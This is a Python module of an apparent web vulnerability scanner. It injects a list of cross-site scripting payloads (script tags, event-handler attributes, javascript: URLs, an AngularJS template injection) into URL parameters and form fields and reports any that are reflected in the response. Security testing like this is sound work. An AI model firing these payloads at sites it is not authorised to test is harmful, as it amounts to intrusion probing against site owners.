"""
XSS scanner — reflected, DOM-sink detection, form injection.
"""
from __future__ import annotations

import re
import time
from typing import List, Optional, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode

import aiohttp

from scanner.utils import http as http_util

PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '{{constructor.constructor("alert(1)")()}}',  # AngularJS
    '<details open ontoggle=alert(1)>',
    '<!--<img src=--><img src=x onerror=alert(1)//>',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)">',
    '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
]

DOM_SINKS = ["innerHTML", "outerHTML", "document.write", "eval(", "setTimeout(", "location.hash"]


async def scan(session: aiohttp.ClientSession, url: str, forms=None) -> List[Dict[str, Any]]:
    findings: List[Dict[str, Any]] = []
    parsed = urlparse(url)

    # ── URL parameter injection ────────────────────────────────────────────────
    if parsed.query:
        params = parse_qs(parsed.query, keep_blank_values=True)
        for param in params:
            for payload in PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload
                test_url = parsed._replace(query=urlencode(test_params)).geturl()
                resp = await http_util.get(session, test_url, timeout=12)
                if resp is None:
                    continue
                try:
                    text = await resp.text(errors="ignore")
                except Exception:
                    continue
                if _reflected(payload, text):
                    findings.append(_make(url, param, payload, "reflected"))
                    break  # one finding per param is enough

    # ── Form injection ─────────────────────────────────────────────────────────
    for (form_url, method, fields) in (forms or []):
        for field in fields:
            for payload in PAYLOADS[:6]:  # top payloads only for forms
                data = dict(fields)
                data[field] = payload
                if method == "post":
                    resp = await http_util.post(session, form_url, data=data, timeout=12)
                else:
                    resp = await http_util.get(session, form_url, params=data, timeout=12)
                if resp is None:
                    continue
                try:
                    text = await resp.text(errors="ignore")
                except Exception:
                    continue
                if _reflected(payload, text):
                    findings.append(_make(form_url, field, payload, "form"))
                    break

    return findings


def _reflected(payload: str, body: str) -> bool:
    return payload in body or re.sub(r'\s+', '', payload) in re.sub(r'\s+', '', body)


def _make(url, param, payload, context) -> Dict[str, Any]:
    return {
        "type":      "xss",
        "severity":  "high",
        "url":       url,
        "parameter": param,
        "payload":   payload,
        "context":   context,
        "evidence":  f"Payload reflected in response",
        "details":   f"Reflected XSS — {context}",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
    }
